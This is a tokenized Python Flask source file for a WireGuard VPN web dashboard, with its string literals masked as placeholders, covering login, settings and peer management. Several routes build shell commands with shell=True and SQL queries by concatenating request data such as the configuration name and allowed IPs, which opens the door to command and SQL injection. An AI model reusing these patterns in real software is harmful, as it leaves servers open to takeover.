<EOL> config_name + "<STR_LIT>" + ip + "<STR_LIT>" , ( public_key , ) ) . fetchone ( ) <EOL> if existed_ip [ <NUM_LIT> ] != <NUM_LIT> : <EOL> return { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : "<STR_LIT>" } <EOL> else : <EOL> return { '<STR_LIT>' : '<STR_LIT>' } <EOL> def f_available_ips ( config_name ) : <EOL> config_interface = read_conf_file_interface ( config_name ) <EOL> if "<STR_LIT>" in config_interface : <EOL> available = [ ] <EOL> existed = [ ] <EOL> conf_address = config_interface [ '<STR_LIT>' ] <EOL> address = conf_address . split ( '<STR_LIT>' ) <EOL> for i in address : <EOL> add , sub = i . split ( "<STR_LIT>" ) <EOL> existed . append ( ipaddress . ip_address ( add . replace ( "<STR_LIT>" , "<STR_LIT>" ) ) ) <EOL> peers = g . cur . execute ( "<STR_LIT>" + config_name ) . fetchall ( ) <EOL> for i in peers : <EOL> add = i [ <NUM_LIT> ] . split ( "<STR_LIT>" ) <EOL> for k in add : <EOL> a , s = k . split ( "<STR_LIT>" ) <EOL> existed . append ( ipaddress . ip_address ( a . strip ( ) ) ) <EOL> count = <NUM_LIT> <EOL> for i in address : <EOL> tmpIP = ipaddress . ip_network ( i . replace ( "<STR_LIT>" , "<STR_LIT>" ) , False ) <EOL> if tmpIP . version == <NUM_LIT> : <EOL> for i in tmpIP . hosts ( ) : <EOL> if i not in existed : <EOL> available . append ( i ) <EOL> count += <NUM_LIT> <EOL> if count > <NUM_LIT> : <EOL> break <EOL> else : <EOL> available = available + list ( tmpIP . hosts ( ) ) <EOL> for i in existed : <EOL> try : <EOL> available . remove ( i ) <EOL> except ValueError : <EOL> pass <EOL> available = [ str ( i ) for i in available ] <EOL> return available <EOL> else : <EOL> return [ ] <EOL> @ app . teardown_request <EOL> def close_DB ( exception ) : <EOL> if hasattr ( g , '<STR_LIT>' ) : <EOL> g . db . commit ( ) <EOL> g . db . close ( ) <EOL> @ app . before_request <EOL> def auth_req ( ) : <EOL> if getattr ( g , '<STR_LIT>' , None ) is None : <EOL> g . db = connect_db ( ) <EOL> g . cur = g . db . cursor ( ) <EOL> conf = get_dashboard_conf ( ) <EOL> req = conf . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> session [ '<STR_LIT>' ] = conf . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> session [ '<STR_LIT>' ] = UPDATE <EOL> session [ '<STR_LIT>' ] = DASHBOARD_VERSION <EOL> if req == "<STR_LIT>" : <EOL> if '<STR_LIT>' not in request . path and request . endpoint != "<STR_LIT>" and request . endpoint != "<STR_LIT>" and request . endpoint != "<STR_LIT>" and "<STR_LIT>" not in session : <EOL> print ( "<STR_LIT>" + str ( request . endpoint ) ) <EOL> if request . endpoint != "<STR_LIT>" : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> else : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> conf . clear ( ) <EOL> redirectURL = str ( request . url ) <EOL> redirectURL = redirectURL . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> redirectURL = redirectURL . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> return redirect ( "<STR_LIT>" + redirectURL ) <EOL> else : <EOL> if request . endpoint in [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' ] : <EOL> conf . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> conf . clear ( ) <EOL> return None <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def signin ( ) : <EOL> message = "<STR_LIT>" <EOL> if "<STR_LIT>" in session : <EOL> message = session [ '<STR_LIT>' ] <EOL> session . pop ( "<STR_LIT>" ) <EOL> return render_template ( '<STR_LIT>' , message = message , version = DASHBOARD_VERSION ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def signout ( ) : <EOL> if "<STR_LIT>" in session : <EOL> session . pop ( "<STR_LIT>" ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def auth ( ) : <EOL> data = request . get_json ( ) <EOL> config = get_dashboard_conf ( ) <EOL> saved_password_hash = config [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> if bcrypt . checkpw ( data [ '<STR_LIT>' ] . encode ( ) , saved_password_hash . encode ( ) ) : <EOL> session [ '<STR_LIT>' ] = data [ '<STR_LIT>' ] <EOL> config . clear ( ) <EOL> return jsonify ( { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> config . clear ( ) <EOL> return jsonify ( { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def index ( ) : <EOL> msg = "<STR_LIT>" <EOL> if "<STR_LIT>" in session : <EOL> msg = session [ "<STR_LIT>" ] <EOL> session . pop ( "<STR_LIT>" ) <EOL> return render_template ( '<STR_LIT>' , conf = get_conf_list ( ) , msg = msg ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def settings ( ) : <EOL> message = "<STR_LIT>" <EOL> status = "<STR_LIT>" <EOL> config = get_dashboard_conf ( ) <EOL> if "<STR_LIT>" in session and "<STR_LIT>" in session : <EOL> message = session [ '<STR_LIT>' ] <EOL> status = session [ '<STR_LIT>' ] <EOL> session . pop ( "<STR_LIT>" ) <EOL> session . pop ( "<STR_LIT>" ) <EOL> required_auth = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> return render_template ( '<STR_LIT>' , conf = get_conf_list ( ) , message = message , status = status , <EOL> app_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , app_port = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> required_auth = required_auth , wg_conf_path = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> peer_global_DNS = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> peer_endpoint_allowed_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> peer_mtu = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> peer_keepalive = config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> peer_remote_endpoint = config . get ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_acct ( ) : <EOL> if len ( request . form [ '<STR_LIT>' ] ) == <NUM_LIT> : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> config = get_dashboard_conf ( ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> try : <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = request . form [ '<STR_LIT>' ] <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> except Exception : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_peer_default_config ( ) : <EOL> config = get_dashboard_conf ( ) <EOL> if len ( request . form [ '<STR_LIT>' ] ) == <NUM_LIT> or len ( request . form [ '<STR_LIT>' ] ) == <NUM_LIT> or len ( request . form [ '<STR_LIT>' ] ) == <NUM_LIT> : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> dns_addresses = request . form [ '<STR_LIT>' ] <EOL> if not check_DNS ( dns_addresses ) : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> dns_addresses = dns_addresses . replace ( "<STR_LIT>" , "<STR_LIT>" ) . split ( '<STR_LIT>' ) <EOL> dns_addresses = "<STR_LIT>" . join ( dns_addresses ) <EOL> ip = request . form [ '<STR_LIT>' ] <EOL> if not check_Allowed_IPs ( ip ) : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> if not len ( request . form [ '<STR_LIT>' ] ) > <NUM_LIT> or not request . form [ '<STR_LIT>' ] . isdigit ( ) : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> if not len ( request . form [ '<STR_LIT>' ] ) > <NUM_LIT> or not request . form [ '<STR_LIT>' ] . isdigit ( ) : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> if not check_remote_endpoint ( request . form [ '<STR_LIT>' ] ) : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , '<STR_LIT>' . join ( clean_IP_with_range ( ip ) ) ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , dns_addresses ) <EOL> try : <EOL> set_dashboard_conf ( config ) <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> except Exception : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_pwd ( ) : <EOL> config = get_dashboard_conf ( ) <EOL> saved_password_hash = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> current_password = request . form [ '<STR_LIT>' ] <EOL> new_password = request . form [ '<STR_LIT>' ] <EOL> rep_new_password = request . form [ '<STR_LIT>' ] <EOL> if bcrypt . checkpw ( current_password . encode ( ) , saved_password_hash . encode ( ) ) : <EOL> if new_password == rep_new_password : <EOL> new_password_hash = bcrypt . hashpw ( new_password . encode ( ) , bcrypt . gensalt ( ) ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , new_password_hash . decode ( ) ) <EOL> try : <EOL> set_dashboard_conf ( config ) <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> except Exception : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> else : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> else : <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return redirect ( url_for ( "<STR_LIT>" ) ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_app_ip_port ( ) : <EOL> config = get_dashboard_conf ( ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> subprocess . Popen ( '<STR_LIT>' , shell = True ) <EOL> return "<STR_LIT>" <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_wg_conf_path ( ) : <EOL> config = get_dashboard_conf ( ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , request . form [ '<STR_LIT>' ] ) <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> session [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> subprocess . Popen ( '<STR_LIT>' , shell = True ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_dashbaord_sort ( ) : <EOL> config = get_dashboard_conf ( ) <EOL> data = request . get_json ( ) <EOL> sort_tag = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> if data [ '<STR_LIT>' ] in sort_tag : <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , data [ '<STR_LIT>' ] ) <EOL> else : <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , '<STR_LIT>' ) <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> return "<STR_LIT>" <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def update_dashboard_refresh_interval ( ) : <EOL> preset_interval = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> if request . form [ "<STR_LIT>" ] in preset_interval : <EOL> config = get_dashboard_conf ( ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , str ( request . form [ '<STR_LIT>' ] ) ) <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> return "<STR_LIT>" <EOL> else : <EOL> return "<STR_LIT>" <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def configuration ( config_name ) : <EOL> config = get_dashboard_conf ( ) <EOL> conf_data = { <EOL> "<STR_LIT>" : config_name , <EOL> "<STR_LIT>" : get_conf_status ( config_name ) , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> if conf_data [ '<STR_LIT>' ] == "<STR_LIT>" : <EOL> conf_data [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> else : <EOL> conf_data [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config_list = get_conf_list ( ) <EOL> if config_name not in [ conf [ '<STR_LIT>' ] for conf in config_list ] : <EOL> return redirect ( '<STR_LIT>' ) <EOL> refresh_interval = int ( config . get ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> dns_address = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> allowed_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> peer_mtu = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> peer_keep_alive = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> config . clear ( ) <EOL> return render_template ( '<STR_LIT>' , conf = get_conf_list ( ) , conf_data = conf_data , <EOL> dashboard_refresh_interval = refresh_interval , <EOL> DNS = dns_address , <EOL> endpoint_allowed_ip = allowed_ip , <EOL> title = config_name , <EOL> mtu = peer_mtu , <EOL> keep_alive = peer_keep_alive ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def get_conf ( config_name ) : <EOL> result = { <EOL> "<STR_LIT>" : True , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { } <EOL> } <EOL> if not session : <EOL> result [ "<STR_LIT>" ] = False <EOL> result [ "<STR_LIT>" ] = "<STR_LIT>" <EOL> return jsonify ( result ) <EOL> if getattr ( g , '<STR_LIT>' , None ) is None : <EOL> g . db = connect_db ( ) <EOL> g . cur = g . db . cursor ( ) <EOL> config_interface = read_conf_file_interface ( config_name ) <EOL> if config_interface != { } : <EOL> search = request . args . get ( '<STR_LIT>' ) <EOL> if len ( search ) == <NUM_LIT> : <EOL> search = "<STR_LIT>" <EOL> search = urllib . parse . unquote ( search ) <EOL> config = get_dashboard_conf ( ) <EOL> sort = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> peer_display_mode = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> wg_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if "<STR_LIT>" not in config_interface : <EOL> conf_address = "<STR_LIT>" <EOL> else : <EOL> conf_address = config_interface [ '<STR_LIT>' ] <EOL> result [ '<STR_LIT>' ] = { <EOL> "<STR_LIT>" : get_peers ( config_name , search , sort ) , <EOL> "<STR_LIT>" : config_name , <EOL> "<STR_LIT>" : get_conf_status ( config_name ) , <EOL> "<STR_LIT>" : get_conf_total_data ( config_name ) , <EOL> "<STR_LIT>" : get_conf_pub_key ( config_name ) , <EOL> "<STR_LIT>" : get_conf_listen_port ( config_name ) , <EOL> "<STR_LIT>" : get_conf_running_peer_number ( config_name ) , <EOL> "<STR_LIT>" : conf_address , <EOL> "<STR_LIT>" : wg_ip , <EOL> "<STR_LIT>" : sort , <EOL> "<STR_LIT>" : int ( config . get ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> "<STR_LIT>" : peer_display_mode , <EOL> "<STR_LIT>" : getLockAccessPeers ( config_name ) <EOL> } <EOL> if result [ '<STR_LIT>' ] [ '<STR_LIT>' ] == "<STR_LIT>" : <EOL> result [ '<STR_LIT>' ] [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> else : <EOL> result [ '<STR_LIT>' ] [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> else : <EOL> result [ '<STR_LIT>' ] = False <EOL> result [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> config . clear ( ) <EOL> return jsonify ( result ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def switch ( config_name ) : <EOL> status = get_conf_status ( config_name ) <EOL> if status == "<STR_LIT>" : <EOL> try : <EOL> check = subprocess . check_output ( "<STR_LIT>" + config_name , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError as exc : <EOL> return jsonify ( { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str ( exc . output . strip ( ) . decode ( "<STR_LIT>" ) ) } ) <EOL> elif status == "<STR_LIT>" : <EOL> try : <EOL> subprocess . check_output ( "<STR_LIT>" + config_name , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError as exc : <EOL> return jsonify ( { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str ( exc . output . strip ( ) . decode ( "<STR_LIT>" ) ) } ) <EOL> return jsonify ( { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def add_peer_bulk ( config_name ) : <EOL> data = request . get_json ( ) <EOL> keys = data [ '<STR_LIT>' ] <EOL> endpoint_allowed_ip = data [ '<STR_LIT>' ] <EOL> dns_addresses = data [ '<STR_LIT>' ] <EOL> enable_preshared_key = data [ "<STR_LIT>" ] <EOL> amount = data [ '<STR_LIT>' ] <EOL> config_interface = read_conf_file_interface ( config_name ) <EOL> if "<STR_LIT>" not in config_interface : <EOL> return "<STR_LIT>" <EOL> if not amount . isdigit ( ) or int ( amount ) < <NUM_LIT> : <EOL> return "<STR_LIT>" <EOL> amount = int ( amount ) <EOL> if not check_DNS ( dns_addresses ) : <EOL> return "<STR_LIT>" <EOL> if not check_Allowed_IPs ( endpoint_allowed_ip ) : <EOL> return "<STR_LIT>" <EOL> if len ( data [ '<STR_LIT>' ] ) == <NUM_LIT> or not data [ '<STR_LIT>' ] . isdigit ( ) : <EOL> return "<STR_LIT>" <EOL> if len ( data [ '<STR_LIT>' ] ) == <NUM_LIT> or not data [ '<STR_LIT>' ] . isdigit ( ) : <EOL> return "<STR_LIT>" <EOL> ips = f_available_ips ( config_name ) <EOL> if amount > len ( ips ) : <EOL> return f"<STR_LIT>" <EOL> wg_command = [ "<STR_LIT>" , "<STR_LIT>" , config_name ] <EOL> sql_command = [ ] <EOL> for i in range ( amount ) : <EOL> keys [ i ] [ '<STR_LIT>' ] = f"<STR_LIT>" <EOL> wg_command . append ( "<STR_LIT>" ) <EOL> wg_command . append ( keys [ i ] [ '<STR_LIT>' ] ) <EOL> keys [ i ] [ '<STR_LIT>' ] = ips . pop ( <NUM_LIT> ) <EOL> if enable_preshared_key : <EOL> keys [ i ] [ '<STR_LIT>' ] = f"<STR_LIT>" <EOL> f = open ( keys [ i ] [ '<STR_LIT>' ] , "<STR_LIT>" ) <EOL> f . write ( keys [ i ] [ '<STR_LIT>' ] ) <EOL> f . close ( ) <EOL> wg_command . append ( "<STR_LIT>" ) <EOL> wg_command . append ( keys [ i ] [ '<STR_LIT>' ] ) <EOL> else : <EOL> keys [ i ] [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> wg_command . append ( "<STR_LIT>" ) <EOL> wg_command . append ( keys [ i ] [ '<STR_LIT>' ] ) <EOL> update = [ "<STR_LIT>" , config_name , "<STR_LIT>" , keys [ i ] [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" , keys [ i ] [ '<STR_LIT>' ] , "<STR_LIT>" , dns_addresses , <EOL> "<STR_LIT>" , endpoint_allowed_ip , "<STR_LIT>" , keys [ i ] [ '<STR_LIT>' ] , "<STR_LIT>" ] <EOL> sql_command . append ( update ) <EOL> try : <EOL> status = subprocess . check_output ( "<STR_LIT>" . join ( wg_command ) , shell = True , stderr = subprocess . STDOUT ) <EOL> status = subprocess . check_output ( "<STR_LIT>" + config_name , shell = True , stderr = subprocess . STDOUT ) <EOL> get_all_peers_data ( config_name ) <EOL> if enable_preshared_key : <EOL> for i in keys : <EOL> os . remove ( i [ '<STR_LIT>' ] ) <EOL> for i in range ( len ( sql_command ) ) : <EOL> sql_command [ i ] = "<STR_LIT>" . join ( sql_command [ i ] ) <EOL> g . cur . executescript ( "<STR_LIT>" . join ( sql_command ) ) <EOL> return "<STR_LIT>" <EOL> except subprocess . CalledProcessError as exc : <EOL> return exc . output . strip ( ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def add_peer ( config_name ) : <EOL> data = request . get_json ( ) <EOL> public_key = data [ '<STR_LIT>' ] <EOL> allowed_ips = data [ '<STR_LIT>' ] <EOL> endpoint_allowed_ip = data [ '<STR_LIT>' ] <EOL> dns_addresses = data [ '<STR_LIT>' ] <EOL> enable_preshared_key = data [ "<STR_LIT>" ] <EOL> preshared_key = data [ '<STR_LIT>' ] <EOL> keys = get_conf_peer_key ( config_name ) <EOL> if len ( public_key ) == <NUM_LIT> or len ( dns_addresses ) == <NUM_LIT> or len ( allowed_ips ) == <NUM_LIT> or len ( endpoint_allowed_ip ) == <NUM_LIT> : <EOL> return "<STR_LIT>" <EOL> if not isinstance ( keys , list ) : <EOL> return config_name + "<STR_LIT>" <EOL> if public_key in keys : <EOL> return "<STR_LIT>" <EOL> check_dup_ip = g . cur . execute ( <EOL> "<STR_LIT>" + config_name + "<STR_LIT>" + allowed_ips + "<STR_LIT>" , ) . fetchone ( ) <EOL> if check_dup_ip [ <NUM_LIT> ] != <NUM_LIT> : <EOL> return "<STR_LIT>" <EOL> if not check_DNS ( dns_addresses ) : <EOL> return "<STR_LIT>" <EOL> if not check_Allowed_IPs ( endpoint_allowed_ip ) : <EOL> return "<STR_LIT>" <EOL> if len ( data [ '<STR_LIT>' ] ) == <NUM_LIT> or not data [ '<STR_LIT>' ] . isdigit ( ) : <EOL> return "<STR_LIT>" <EOL> if len ( data [ '<STR_LIT>' ] ) == <NUM_LIT> or not data [ '<STR_LIT>' ] . isdigit ( ) : <EOL> return "<STR_LIT>" <EOL> try : <EOL> if enable_preshared_key : <EOL> now = str ( datetime . now ( ) . strftime ( "<STR_LIT>" ) ) <EOL> f_name = now + "<STR_LIT>" <EOL> f = open ( f_name , "<STR_LIT>" ) <EOL> f . write ( preshared_key ) <EOL> f . close ( ) <EOL> status = subprocess . check_output ( <EOL> f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> os . remove ( f_name ) <EOL> elif not enable_preshared_key : <EOL> status = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> status = subprocess . check_output ( "<STR_LIT>" + config_name , shell = True , stderr = subprocess . STDOUT ) <EOL> get_all_peers_data ( config_name ) <EOL> sql = "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> g . cur . execute ( sql , ( data [ '<STR_LIT>' ] , data [ '<STR_LIT>' ] , data [ '<STR_LIT>' ] , endpoint_allowed_ip , public_key ) ) <EOL> return "<STR_LIT>" <EOL> except subprocess . CalledProcessError as exc : <EOL> return exc . output . strip ( ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def remove_peer ( config_name ) : <EOL> if get_conf_status ( config_name ) == "<STR_LIT>" : <EOL> return "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> data = request . get_json ( ) <EOL> delete_keys = data [ '<STR_LIT>' ] <EOL> keys = get_conf_peer_key ( config_name ) <EOL> if not isinstance ( keys , list ) : <EOL> return config_name + "<STR_LIT>" <EOL> else : <EOL> return deletePeers ( config_name , delete_keys , g . cur , g . db ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def save_peer_setting ( config_name ) : <EOL> data = request . get_json ( ) <EOL> id = data [ '<STR_LIT>' ] <EOL> name = data [ '<STR_LIT>' ] <EOL> private_key = data [ '<STR_LIT>' ] <EOL> dns_addresses = data [ '<STR_LIT>' ] <EOL> allowed_ip = data [ '<STR_LIT>' ] <EOL> endpoint_allowed_ip = data [ '<STR_LIT>' ] <EOL> preshared_key = data [ '<STR_LIT>' ] <EOL> check_peer_exist = g . cur . execute ( "<STR_LIT>" + config_name + "<STR_LIT>" , ( id , ) ) . fetchone ( ) <EOL> if check_peer_exist [ <NUM_LIT> ] == <NUM_LIT> : <EOL> check_ip = check_repeat_allowed_ip ( id , allowed_ip , config_name ) <EOL> if not check_IP_with_range ( endpoint_allowed_ip ) : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> if not check_DNS ( dns_addresses ) : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> if len ( data [ '<STR_LIT>' ] ) == <NUM_LIT> or not data [ '<STR_LIT>' ] . isdigit ( ) : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> if len ( data [ '<STR_LIT>' ] ) == <NUM_LIT> or not data [ '<STR_LIT>' ] . isdigit ( ) : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> if private_key != "<STR_LIT>" : <EOL> check_key = f_check_key_match ( private_key , id , config_name ) <EOL> if check_key [ '<STR_LIT>' ] == "<STR_LIT>" : <EOL> return jsonify ( check_key ) <EOL> if check_ip [ '<STR_LIT>' ] == "<STR_LIT>" : <EOL> return jsonify ( check_ip ) <EOL> try : <EOL> tmp_psk = open ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> tmp_psk . write ( preshared_key ) <EOL> tmp_psk . close ( ) <EOL> change_psk = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> if change_psk . decode ( "<STR_LIT>" ) != "<STR_LIT>" : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : change_psk . decode ( "<STR_LIT>" ) } ) <EOL> if allowed_ip == "<STR_LIT>" : <EOL> allowed_ip = '<STR_LIT>' <EOL> allowed_ip = allowed_ip . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> change_ip = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> subprocess . check_output ( f'<STR_LIT>' , shell = True , stderr = subprocess . STDOUT ) <EOL> if change_ip . decode ( "<STR_LIT>" ) != "<STR_LIT>" : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : change_ip . decode ( "<STR_LIT>" ) } ) <EOL> sql = "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> 